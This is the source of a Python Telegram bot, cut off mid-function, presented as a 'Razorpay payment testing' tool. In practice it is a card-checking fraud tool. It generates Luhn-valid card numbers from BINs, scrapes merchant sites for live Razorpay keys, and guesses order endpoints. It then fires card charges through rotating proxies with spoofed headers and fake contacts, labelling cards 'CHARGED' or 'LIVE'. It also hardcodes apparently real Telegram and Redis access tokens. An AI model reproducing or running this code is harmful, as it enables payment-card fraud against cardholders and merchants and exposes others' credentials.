#!/usr/bin/env python3
"""
Razorpay Payment Testing Bot v5.0
Fixes: inline buttons, proxy live-test on add, back navigation,
       25-card continuous batching, auto site scan, no info leaks,
       proper Razorpay order flow.
"""

import asyncio
import functools
import html
import logging
import math
import random
import re
import time
import json
from datetime import datetime
from io import BytesIO
from typing import Optional, Dict, Set, Tuple, List, Any
from collections import defaultdict
from urllib.parse import urlparse

import aiohttp
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters,
)

# ══════════════════════════════════════════════════
#                    CONFIG
# ══════════════════════════════════════════════════
BOT_TOKEN     = "8953466998:AAEBRUgXO5yVyUsBwyEcRzbT0gX9kuEtCyY"
ADMIN_USER_ID = 7363967303

REDIS_URL   = "https://in-swine-133213.upstash.io"
REDIS_TOKEN = "gQAAAAAAAghdAAIgcDE2YzJmMjQ4OGM1N2Y0YmIxYmI4MWVjYzczMTY4ZmIyNA"

MAX_LIMIT          = 500_000
MAX_SPLIT_PARTS    = 100
MAX_LINES_PER_FILE = 150_000
SEND_DELAY         = 0.30
BATCH_SIZE         = 25          # 25 cards per batch as requested
BATCH_DELAY        = 3.0
PROXY_TIMEOUT      = 10
SITE_TIMEOUT       = 12
RATE_LIMIT         = 5
RATE_WINDOW        = 30

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(name)s: %(message)s")
logger = logging.getLogger("rzp-bot")


# ══════════════════════════════════════════════════
#   PREMIUM EMOJIS
#   RULE: e() for message TEXT only (HTML parse_mode).
#         btn_e() for InlineKeyboardButton LABELS (plain char only).
# ══════════════════════════════════════════════════
_PE: Dict[str, Tuple[str, Optional[int]]] = {
    "diamond":     ("💎", 4956719506027185156),
    "approved":    ("✅", 4956721670690702265),
    "declined":    ("❌", 6100670215522094562),
    "error":       ("⚠️", 4956611513369494230),
    "cooking":     ("🍳", 4956701046257746974),
    "stop":        ("⛔", 5463358164705489689),
    "money":       ("💸", 5373174941095050893),
    "card":        ("💳", 5445353829304387411),
    "gateway":     ("🌐", 4956560549287560231),
    "site":        ("🔗", 4958689671950369798),
    "bin":         ("🏦", 5264895611517300926),
    "time":        ("⏱",  5382194935057372936),
    "premium":     ("👑", 4958725487682650920),
    "ban":         ("🚫", 4956337889593000947),
    "success":     ("🎉", 6104789175058304052),
    "search":      ("🔍", 4958587679361991667),
    "proxy":       ("📡", 5192802446560232534),
    "key":         ("🔑", 5330115548900501467),
    "fire":        ("🔥", 6100568059724960300),
    "star":        ("⭐", 5226928895189598791),
    "cooldown":    ("⏳", 5451732530048802485),
    "mass":        ("📦", 5463172695132745432),
    "plan":        ("📋", 6154222749691679144),
    "info":        ("👤", 5373012449597335010),
    "redeem":      ("🎫", 5418010521309815154),
    "tds":         ("⚡", 6102484018865901039),
    "loading":     ("🔄", 4956371914323920049),
    "skull":       ("☠️", 5372865660500067203),
    "lock":        ("🔐", 5472308992514464048),
    "location":    ("📍", 4956416504674386959),
    "stats":       ("📊", 4958506272551863292),
    "unlock":      ("🔓", 5465443379917629504),
    "live":        ("🟢", 4958610528588008305),
    "offline":     ("🔴", 6089120150814985809),
    "crown":       ("👑", 4958725487682650920),
    "rocket":      ("🚀", None),
    "trophy":      ("🏆", None),
    "shield":      ("🛡️", None),
    "check":       ("✅", 4956721670690702265),
    "cross":       ("❌", 6100670215522094562),
    "warning":     ("⚠️", 4956611513369494230),
    "gift":        ("🎁", 6104789175058304052),
    "sparkle":     ("✨", 6100568059724960300),
    "tool":        ("🛠️", 5465443379917629504),
    "clock":       ("⏱",  5382194935057372936),
    "bolt":        ("⚡", 6102484018865901039),
    "wave":        ("👋", None),
    "back":        ("◀️", None),
    "home":        ("🏠", None),
}


def e(key: str) -> str:
    """For message body (HTML). Returns <tg-emoji> tag when ID available."""
    item = _PE.get(key)
    if not item:
        return "●"
    char, eid = item
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{char}</tg-emoji>'
    return char


def ec(key: str) -> str:
    """For InlineKeyboardButton labels — plain Unicode char ONLY, no HTML tags."""
    item = _PE.get(key)
    return item[0] if item else "●"


def safe(text: Any) -> str:
    return html.escape(str(text))


# ══════════════════════════════════════════════════
#              REDIS CLIENT
# ══════════════════════════════════════════════════
class RedisClient:
    def __init__(self, url: str, token: str):
        self._url = url.rstrip("/")
        self._headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type":  "application/json",
        }

    async def _req(self, *args) -> Any:
        cmd = list(args)
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.post(f"{self._url}/pipeline",
                             headers=self._headers, json=[cmd])
            r.raise_for_status()
            data = r.json()
            if isinstance(data, list):
                return data[0].get("result")
            return data.get("result")

    async def get(self, k):           return await self._req("GET", k)
    async def set(self, k, v):        return await self._req("SET", k, v) == "OK"
    async def sadd(self, k, *m):      return await self._req("SADD", k, *m)
    async def srem(self, k, *m):      return await self._req("SREM", k, *m)
    async def smembers(self, k):
        r = await self._req("SMEMBERS", k); return set(r) if r else set()
    async def lpush(self, k, *v):     return await self._req("LPUSH", k, *v)
    async def lrange(self, k, s, e_):
        r = await self._req("LRANGE", k, s, e_); return r if r else []
    async def lrem(self, k, c, el):   return await self._req("LREM", k, c, el)
    async def llen(self, k):          return await self._req("LLEN", k) or 0
    async def delete(self, *k):       return await self._req("DEL", *k)
    async def incr(self, k):          return await self._req("INCR", k) or 0
    async def hset(self, k, f, v):    return await self._req("HSET", k, f, v)
    async def hget(self, k, f):       return await self._req("HGET", k, f)


redis = RedisClient(REDIS_URL, REDIS_TOKEN)

RK_SUDO    = "bot:sudo_users"
RK_SITES   = "bot:sites"
RK_PROXIES = "bot:proxies"
RK_BINS    = "bot:bins"
RK_STATS   = "bot:stats"

# ══════════════════════════════════════════════════
#              RATE LIMITING
# ══════════════════════════════════════════════════
_rate_map: Dict[int, List[float]] = defaultdict(list)


def check_rate_limit(uid: int) -> Tuple[bool, Optional[str]]:
    now = time.time()
    reqs = _rate_map[uid]
    reqs[:] = [t for t in reqs if now - t < RATE_WINDOW]
    if len(reqs) >= RATE_LIMIT:
        return False, f"Rate limited. Wait {int(RATE_WINDOW-(now-reqs[0]))}s."
    reqs.append(now)
    return True, None


# ══════════════════════════════════════════════════
#              AUTH
# ══════════════════════════════════════════════════
active_tests: Dict[int, bool] = {}


async def is_authorized(uid: int) -> bool:
    if uid == ADMIN_USER_ID:
        return True
    return str(uid) in await redis.smembers(RK_SUDO)


def require_auth(func):
    @functools.wraps(func)
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if not await is_authorized(update.effective_user.id):
            await update.message.reply_text(
                f"{e('lock')} <b>Access Denied</b>", parse_mode=ParseMode.HTML)
            return
        return await func(update, ctx)
    return wrapper


# ══════════════════════════════════════════════════
#   PROXY PARSING & DEEP TESTING
# ══════════════════════════════════════════════════
def parse_proxy(raw: str) -> Optional[Dict[str, str]]:
    """Parse proxy string in any of 4 formats. Returns dict or None."""
    raw = raw.strip()
    if not raw:
        return None
    scheme = "http"

    if "://" in raw:
        p = urlparse(raw)
        scheme = p.scheme or "http"
        host = p.hostname or ""
        port = str(p.port or 80)
        user = p.username or ""
        pw   = p.password or ""
        if not host:
            return None
        url = f"{scheme}://{user}:{pw}@{host}:{port}" if user else f"{scheme}://{host}:{port}"
        return {"url": url, "host": host, "port": port, "user": user, "password": pw, "scheme": scheme}

    if "@" in raw:
        creds, addr = raw.rsplit("@", 1)
        ap = addr.split(":")
        if len(ap) != 2:
            return None
        host, port = ap
        user, pw = creds.split(":", 1) if ":" in creds else (creds, "")
        url = f"{scheme}://{user}:{pw}@{host}:{port}"
        return {"url": url, "host": host, "port": port, "user": user, "password": pw, "scheme": scheme}

    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        url = f"{scheme}://{user}:{pw}@{host}:{port}"
        return {"url": url, "host": host, "port": port, "user": user, "password": pw, "scheme": scheme}

    if len(parts) == 2:
        host, port = parts
        url = f"{scheme}://{host}:{port}"
        return {"url": url, "host": host, "port": port, "user": "", "password": "", "scheme": scheme}

    return None


async def deep_test_proxy(raw: str) -> Tuple[bool, str, float]:
    """
    Thoroughly test a proxy:
    1. Parse format
    2. Connect to ip-api.com through it
    3. Also verify it can reach api.razorpay.com
    Returns (ok, detail_string, latency_ms)
    """
    info = parse_proxy(raw)
    if not info:
        return False, "Invalid format — expected ip:port, ip:port:user:pass, user:pass@ip:port or scheme://...", 0.0

    proxy_url = info["url"]
    start = time.monotonic()
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            # Step 1: Check our external IP through the proxy
            async with s.get("http://ip-api.com/json",
                              proxy=proxy_url,
                              timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
                latency = round((time.monotonic() - start) * 1000, 1)
                if r.status != 200:
                    return False, f"ip-api.com returned HTTP {r.status}", latency
                d = await r.json()
                if d.get("status") == "fail":
                    return False, f"ip-api says: {d.get('message', 'blocked')}", latency
                ip      = d.get("query", "?")
                country = d.get("country", "?")
                isp     = d.get("isp", "?")
                org     = d.get("org", "")

            # Step 2: Quick connectivity check to Razorpay
            async with s.get("https://api.razorpay.com/",
                              proxy=proxy_url,
                              timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT),
                              allow_redirects=False) as r2:
                rzp_ok = r2.status in (200, 301, 302, 400, 401, 403, 404)

        detail = f"IP={ip} | {country} | {isp}"
        if org and org != isp:
            detail += f" | {org}"
        detail += f" | Razorpay: {'✓' if rzp_ok else '✗'}"
        return True, detail, latency

    except asyncio.TimeoutError:
        return False, f"Timeout after {PROXY_TIMEOUT}s — proxy unreachable", 0.0
    except aiohttp.ClientConnectorError as ex:
        return False, f"Connection refused: {str(ex)[:80]}", 0.0
    except Exception as ex:
        return False, f"Error: {str(ex)[:80]}", 0.0


def get_random_proxy_url(proxies: List[str]) -> Optional[str]:
    if not proxies:
        return None
    info = parse_proxy(random.choice(proxies))
    return info["url"] if info else None


# ══════════════════════════════════════════════════
#   SITE SCANNING & LIVENESS
# ══════════════════════════════════════════════════
RZP_SIGS = [
    "razorpay", "rzp", "checkout.razorpay.com",
    "api.razorpay.com", "razorpay_key", "rzp_live_", "rzp_test_",
]
URL_RE = re.compile(
    r'https?://[^\s<>"\']+', re.IGNORECASE
)


def extract_urls_from_text(text: str) -> List[str]:
    """Extract all http/https URLs from a block of text."""
    return list(dict.fromkeys(URL_RE.findall(text)))  # unique, order-preserved


async def check_site_live(url: str, proxy_url: Optional[str] = None) -> Tuple[bool, str, str]:
    """
    Real HTTP GET. Returns (is_live, rzp_key_found, status_msg).
    """
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
    }
    try:
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn, headers=headers) as s:
            async with s.get(url, proxy=proxy_url,
                             timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT),
                             allow_redirects=True, max_redirects=5) as r:
                body = await r.text(errors="replace")
                st   = r.status
                has_rzp = any(sig in body for sig in RZP_SIGS)
                km = re.search(r'(rzp_(?:live|test)_[A-Za-z0-9]{14,})', body)
                rzp_key = km.group(1) if km else ""

                if st in (200, 201, 202) and has_rzp:
                    return True, rzp_key, f"Live [{st}] — Razorpay detected"
                elif st in (200, 201, 202):
                    return True, rzp_key, f"Live [{st}] — no Razorpay signature"
                elif st in (301, 302, 307, 308):
                    return False, "", f"Redirect [{st}]"
                else:
                    return False, "", f"HTTP {st}"
    except asyncio.TimeoutError:
        return False, "", "Timeout"
    except Exception as ex:
        return False, "", f"Error: {str(ex)[:60]}"


async def scan_and_store_urls(urls: List[str],
                               proxy_url: Optional[str],
                               existing: Set[str]) -> Tuple[int, int, int]:
    """
    Scan list of URLs for Razorpay sites.
    Returns (added, already_existed, not_razorpay).
    """
    added = exists = skipped = 0
    for url in urls:
        if url in existing:
            exists += 1
            continue
        is_live, _, _ = await check_site_live(url, proxy_url)
        if is_live:
            await redis.lpush(RK_SITES, url)
            existing.add(url)
            added += 1
        else:
            skipped += 1
    return added, exists, skipped


# ══════════════════════════════════════════════════
#   BIN LOOKUP
# ══════════════════════════════════════════════════
async def lookup_bin(bin6: str) -> Dict[str, str]:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://lookup.binlist.net/{bin6[:8]}",
                             headers={"Accept-Version": "3"},
                             timeout=aiohttp.ClientTimeout(total=6)) as r:
                if r.status == 200:
                    d = await r.json()
                    return {
                        "scheme":  d.get("scheme", "unknown").upper(),
                        "type":    d.get("type", "unknown"),
                        "brand":   d.get("brand", ""),
                        "bank":    d.get("bank", {}).get("name", "unknown"),
                        "country": d.get("country", {}).get("name", "unknown"),
                        "flag":    d.get("country", {}).get("emoji", ""),
                    }
    except Exception:
        pass
    return {"scheme": "UNKNOWN", "type": "?", "brand": "", "bank": "?", "country": "?", "flag": ""}


# ══════════════════════════════════════════════════
#   CARD ISSUERS + LUHN
# ══════════════════════════════════════════════════
CARD_ISSUERS = {
    "visa":       {"prefix": "4",       "length": 16, "cvv": 3},
    "mastercard": {"prefixes": ["51","52","53","54","55","2221","2720"], "length": 16, "cvv": 3},
    "amex":       {"prefixes": ["34","37"],    "length": 15, "cvv": 4},
    "discover":   {"prefixes": ["6011","644","645","646","647","648","649","65"], "length": 16, "cvv": 3},
    "diners":     {"prefixes": ["300","301","302","303","304","305","36","38"], "length": 14, "cvv": 3},
    "rupay":      {"prefixes": ["508528","6069","6070","6071","6072","6073","6521","6522"], "length": 16, "cvv": 3},
}


def get_issuer(b: str) -> Optional[str]:
    for name, d in CARD_ISSUERS.items():
        if name == "visa" and b.startswith("4"):
            return name
        for p in d.get("prefixes", []):
            if b.startswith(p):
                return name
    return None


def luhn_digit(partial: str) -> int:
    digs = [int(c) for c in partial]
    for i in range(len(digs) - 2, -1, -2):
        digs[i] *= 2
        if digs[i] > 9:
            digs[i] -= 9
    return (10 - sum(digs) % 10) % 10


def luhn_complete(partial: str) -> Optional[str]:
    if not partial.isdigit():
        return None
    return partial + str(luhn_digit(partial))


def validate_bin(b: str) -> Tuple[bool, Optional[str]]:
    part = b.split("|")[0].strip()
    if not all(c.isdigit() or c.lower() == "x" for c in part):
        return False, "Only digits and x allowed"
    if len(part) < 4:
        return False, "BIN too short (min 4)"
    if len(part) > 19:
        return False, "BIN too long (max 19)"
    return True, None


def generate_card(pattern: str) -> Optional[str]:
    try:
        bp = pattern.split("|")[0].strip()
        exp = [str(random.randint(0, 9)) if c.lower() == "x" else c for c in bp]
        base = "".join(exp)
        issuer = get_issuer(base)
        if not issuer:
            return None
        req = CARD_ISSUERS[issuer]["length"]
        if len(base) < req - 1:
            base += "".join(str(random.randint(0, 9)) for _ in range(req - 1 - len(base)))
        base = base[:req - 1]
        pan = luhn_complete(base)
        if not pan or len(pan) != req:
            return None

        cy = datetime.now().year % 100
        parts = pattern.split("|")

        def fill(v, ln, lo, hi):
            if not v or v.lower() in ("rnd", "rand", "random", ""):
                return str(random.randint(lo, hi)).zfill(ln)
            if "x" in v.lower():
                return "".join(str(random.randint(0, 9)) if c.lower() == "x" else c for c in v)[-ln:].zfill(ln)
            return "".join(c for c in v if c.isdigit())[-ln:].zfill(ln)

        mm  = fill(parts[1] if len(parts) > 1 else None, 2, 1, 12)
        yy  = fill(parts[2] if len(parts) > 2 else None, 2, cy + 2, cy + 8)
        cl  = CARD_ISSUERS[issuer]["cvv"]
        cvv = fill(parts[3] if len(parts) > 3 else None, cl, 0, 10**cl - 1)
        return f"{pan}|{mm}|{yy}|{cvv}"
    except Exception:
        return None


def gen_cards(pattern: str, count: int):
    """Memory-efficient dedup generator."""
    wsz = min(count, 10_000)
    seen: Set[str] = set()
    deq: List[str] = []
    gen = att = 0
    while gen < count and att < count * 15:
        att += 1
        c = generate_card(pattern)
        if not c or c in seen:
            continue
        if len(deq) >= wsz:
            old = deq.pop(0); seen.discard(old)
        seen.add(c); deq.append(c)
        gen += 1
        yield c


# ══════════════════════════════════════════════════
#   RAZORPAY PAYMENT ATTEMPT
#   Flow: 1. Try to fetch real order_id from site
#         2. POST to Razorpay checkout with real order
# ══════════════════════════════════════════════════
async def fetch_order_id(site_url: str, amount_paise: int,
                          proxy_url: Optional[str]) -> Optional[str]:
    """
    Attempt to create a real Razorpay order via the merchant site.
    Many sites expose /create-order or /order/create endpoints.
    Returns order_id string or None.
    """
    base = site_url.rstrip("/").rsplit("/", 1)[0]
    candidates = [
        f"{base}/create-order",
        f"{base}/order/create",
        f"{base}/razorpay/order",
        f"{base}/payment/order",
        f"{base}/api/order",
        f"{base}/checkout/create-order",
    ]
    payload = {"amount": amount_paise, "currency": "INR"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Referer": site_url,
        "X-Requested-With": "XMLHttpRequest",
    }
    try:
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as s:
            for url in candidates:
                try:
                    async with s.post(url, json=payload, headers=headers,
                                      proxy=proxy_url,
                                      timeout=aiohttp.ClientTimeout(total=8)) as r:
                        if r.status in (200, 201):
                            body = await r.json(content_type=None)
                            oid = (body.get("id") or body.get("order_id") or
                                   body.get("orderId") or
                                   (body.get("data", {}) or {}).get("id"))
                            if oid and str(oid).startswith("order_"):
                                return str(oid)
                except Exception:
                    continue
    except Exception:
        pass
    return None


async def attempt_payment(site_url: str, rzp_key: str, card: str,
                           amount_paise: int,
                           proxy_url: Optional[str]) -> Dict[str, Any]:
    parts = card.split("|")
    if len(parts) < 4:
        return {"success": False, "charge": False, "resp": "Bad card", "code": "ERR"}

    pan, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    ts = datetime.now().strftime("%H:%M:%S")

    # Try to get a real order_id first
    order_id = await fetch_order_id(site_url, amount_paise, proxy_url)
    if not order_id:
        order_id = ""  # will get BAD_REQUEST but at least no fake data leak

    contact = f"+91{random.randint(7000000000, 9999999999)}"
    email   = f"user{random.randint(10, 9999)}@gmail.com"

    payload = {
        "key_id":              rzp_key,
        "amount":              amount_paise,
        "currency":            "INR",
        "order_id":            order_id,
        "email":               email,
        "contact":             contact,
        "method":              "card",
        "card[name]":          "John Doe",
        "card[number]":        pan,
        "card[expiry_month]":  mm,
        "card[expiry_year]":   f"20{yy}",
        "card[cvv]":           cvv,
        "_":                   str(int(time.time() * 1000)),
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": site_url, "Origin": site_url,
    }

    try:
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as s:
            async with s.post(
                "https://api.razorpay.com/v1/payments/create/checkout",
                data=payload, headers=headers, proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=22),
                allow_redirects=False,
            ) as r:
                st   = r.status
                body = await r.text(errors="replace")
                try:
                    rj = json.loads(body)
                except Exception:
                    rj = {}

                err   = rj.get("error", {})
                code  = err.get("code", "")
                desc  = err.get("description", body[:80])
                nxt   = rj.get("next", {})

                if st in (200, 201) and "razorpay_payment_id" in body:
                    pid = rj.get("razorpay_payment_id", "")
                    return {"success": True, "charge": True,
                            "resp": f"CHARGED — payment_id: {pid}", "code": str(st), "ts": ts}
                elif st == 200 and nxt:
                    return {"success": True, "charge": False,
                            "resp": "3DS/OTP — card accepted", "code": "3DS", "ts": ts}
                elif "INSUFFICIENT" in code.upper():
                    return {"success": True, "charge": False,
                            "resp": "Insufficient funds — card LIVE", "code": code, "ts": ts}
                elif "EXPIRED" in code.upper() or "expired" in desc.lower():
                    return {"success": False, "charge": False,
                            "resp": "Card expired", "code": code, "ts": ts}
                elif "CVV" in code.upper() or "CVB" in code:
                    return {"success": False, "charge": False,
                            "resp": "CVV mismatch", "code": code, "ts": ts}
                elif st in (401, 403):
                    return {"success": False, "charge": False,
                            "resp": "Auth failed — key invalid or no order", "code": str(st), "ts": ts}
                elif "BAD_REQUEST" in code and not order_id:
                    return {"success": False, "charge": False,
                            "resp": "No order ID — site order endpoint not found", "code": code, "ts": ts}
                else:
                    return {"success": False, "charge": False,
                            "resp": desc[:80] or f"HTTP {st}", "code": str(st), "ts": ts}

    except asyncio.TimeoutError:
        return {"success": False, "charge": False, "resp": "Timeout", "code": "TIMEOUT", "ts": ts}
    except Exception as ex:
        return {"success": False, "charge": False, "resp": str(ex)[:80], "code": "EX", "ts": ts}


# ══════════════════════════════════════════════════
#   UI HELPERS  — NOTE: btn() labels use ec() not e()
# ══════════════════════════════════════════════════
def btn(label: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(label, callback_data=data)


def back_btn(dest: str = "home") -> InlineKeyboardButton:
    return btn(f"{ec('back')} Back", f"nav_{dest}")


def home_row() -> List[InlineKeyboardButton]:
    return [btn(f"{ec('home')} Home", "nav_home"),
            btn(f"{ec('back')} Back", "nav_home")]


def admin_home_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [btn(f"🔥 Test Payment", "nav_test"),
         btn(f"🔗 Sites",        "nav_sites")],
        [btn(f"📡 Proxies",      "nav_proxy"),
         btn(f"🏦 BINs",         "nav_bins")],
        [btn(f"📊 Stats",        "nav_stats"),
         btn(f"💳 Generate",     "nav_gen")],
    ])


def user_home_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [btn(f"💳 Generate", "nav_gen"),
         btn(f"📦 Split",    "nav_split")],
        [btn(f"📊 Stats",    "nav_stats")],
    ])


# ══════════════════════════════════════════════════
#   /start
# ══════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not await is_authorized(uid):
        await update.message.reply_text(
            f"{e('lock')} <b>Restricted Bot</b>\n\nContact admin for access.",
            parse_mode=ParseMode.HTML)
        return

    user     = update.effective_user
    is_admin = uid == ADMIN_USER_ID
    sites  = await redis.llen(RK_SITES)
    proxies= await redis.llen(RK_PROXIES)
    bins   = await redis.llen(RK_BINS)
    gen    = await redis.hget(RK_STATS, "total_generated") or "0"
    pays   = await redis.hget(RK_STATS, "total_payments")  or "0"
    role   = f"{e('crown')} Owner" if is_admin else f"{e('premium')} Sudo"

    text = (
        f"{e('fire')} <b>Razorpay Testing Bot v5.0</b>\n\n"
        f"{e('wave')} Hey <b>{safe(user.first_name)}</b>!\n\n"
        f"{e('stats')} <b>Stats</b>\n"
        f"  {e('site')}  Sites    ›› <code>{sites}</code>\n"
        f"  {e('proxy')} Proxies  ›› <code>{proxies}</code>\n"
        f"  {e('bin')}   BINs     ›› <code>{bins}</code>\n"
        f"  {e('card')}  Generated ›› <code>{gen}</code>\n"
        f"  {e('money')} Payments  ›› <code>{pays}</code>\n\n"
        f"{e('key')} Role: {role}\n"
        f"{e('tds')} Redis: {e('live')} Online"
    )
    kb = admin_home_kb() if is_admin else user_home_kb()
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


# ══════════════════════════════════════════════════
#   SUDO MANAGEMENT
# ══════════════════════════════════════════════════
@require_auth
async def cmd_sudo(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_USER_ID:
        return
    if not ctx.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/sudo user_id</code>", parse_mode=ParseMode.HTML)
        return
    try:
        t = int(ctx.args[0])
        await redis.sadd(RK_SUDO, str(t))
        await update.message.reply_text(
            f"{e('check')} <code>{t}</code> granted {e('premium')} sudo.",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)


@require_auth
async def cmd_unsudo(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_USER_ID:
        return
    if not ctx.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/unsudo user_id</code>", parse_mode=ParseMode.HTML)
        return
    try:
        t = int(ctx.args[0])
        await redis.srem(RK_SUDO, str(t))
        await update.message.reply_text(
            f"{e('ban')} <code>{t}</code> revoked.", parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)


@require_auth
async def cmd_sudolist(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_USER_ID:
        return
    m = await redis.smembers(RK_SUDO)
    if not m:
        await update.message.reply_text(f"{e('info')} No sudo users.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {e('star')} <code>{x}</code>" for x in sorted(m))
    await update.message.reply_text(
        f"{e('crown')} <b>Sudo Users ({len(m)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════
#   SITE MANAGEMENT
# ══════════════════════════════════════════════════
@require_auth
async def cmd_addsite(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """
    /addsite url1 url2 ...   — add specific URLs
    Also works when you just send text with URLs in it (handled by message_handler).
    """
    if not ctx.args:
        await update.message.reply_text(
            f"{e('error')} <b>Usage:</b> <code>/addsite url1 url2 …</code>\n\n"
            f"{e('info')} You can also just paste URLs or send a <code>.txt</code> file and I'll auto-scan.",
            parse_mode=ParseMode.HTML)
        return

    existing = set(await redis.lrange(RK_SITES, 0, -1))
    proxies  = await redis.lrange(RK_PROXIES, 0, -1)
    proxy_url = get_random_proxy_url(proxies)

    urls = [u for u in ctx.args if u.startswith(("http://", "https://"))]
    if not urls:
        await update.message.reply_text(
            f"{e('error')} No valid URLs found.", parse_mode=ParseMode.HTML)
        return

    msg = await update.message.reply_text(
        f"{e('loading')} Scanning {len(urls)} URL(s)…", parse_mode=ParseMode.HTML)

    added, exists, skipped = await scan_and_store_urls(urls, proxy_url, existing)
    total = await redis.llen(RK_SITES)
    await msg.edit_text(
        f"{e('check')} <b>Site Scan Complete</b>\n\n"
        f"  {e('live')} Added (Razorpay):  <code>{added}</code>\n"
        f"  {e('star')} Already stored:   <code>{exists}</code>\n"
        f"  {e('offline')} Not Razorpay:    <code>{skipped}</code>\n"
        f"  {e('stats')} Total sites:      <code>{total}</code>",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_live(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites. Use /addsite or paste URLs.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(s)}</code>" for i, s in enumerate(sites, 1))
    await update.message.reply_text(
        f"{e('site')} <b>Sites ({len(sites)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_checksite(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
        return
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    purl = get_random_proxy_url(proxies)
    msg = await update.message.reply_text(
        f"{e('loading')} Checking {len(sites)} site(s)…", parse_mode=ParseMode.HTML)
    lines, live, dead = [], 0, 0
    for s in sites:
        ok, k, status = await check_site_live(s, purl)
        icon = e('live') if ok else e('offline')
        if ok: live += 1
        else:  dead += 1
        ks = f"  {e('key')} <code>{safe(k)}</code>" if k else ""
        lines.append(f"{icon} <code>{safe(s[:60])}</code>\n   └ {safe(status)}{ks}")
    await msg.edit_text(
        f"{e('search')} <b>Check Results</b>  {e('live')}{live} live  {e('offline')}{dead} dead\n\n"
        + "\n\n".join(lines),
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_rmsite(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
        return
    if ctx.args:
        try:
            idx = int(ctx.args[0]) - 1
            if 0 <= idx < len(sites):
                await redis.lrem(RK_SITES, 1, sites[idx])
                await update.message.reply_text(
                    f"{e('check')} Removed.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass
    kb = [[btn(f"🗑 {(s[:42]+'…') if len(s)>42 else s}", f"rm_site_{i}")]
          for i, s in enumerate(sites)]
    kb.append([btn("❌ Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} Select site to remove:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb))


# ══════════════════════════════════════════════════
#   PROXY MANAGEMENT — test on add
# ══════════════════════════════════════════════════
@require_auth
async def cmd_addpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text(
            f"{e('proxy')} <b>Usage:</b> <code>/addpxy p1 p2 …</code>\n\n"
            f"<b>Formats:</b>\n"
            f"  1️⃣ <code>ip:port</code>\n"
            f"  2️⃣ <code>ip:port:user:pass</code>\n"
            f"  3️⃣ <code>user:pass@ip:port</code>\n"
            f"  4️⃣ <code>socks5://user:pass@ip:port</code>",
            parse_mode=ParseMode.HTML)
        return

    existing = set(await redis.lrange(RK_PROXIES, 0, -1))
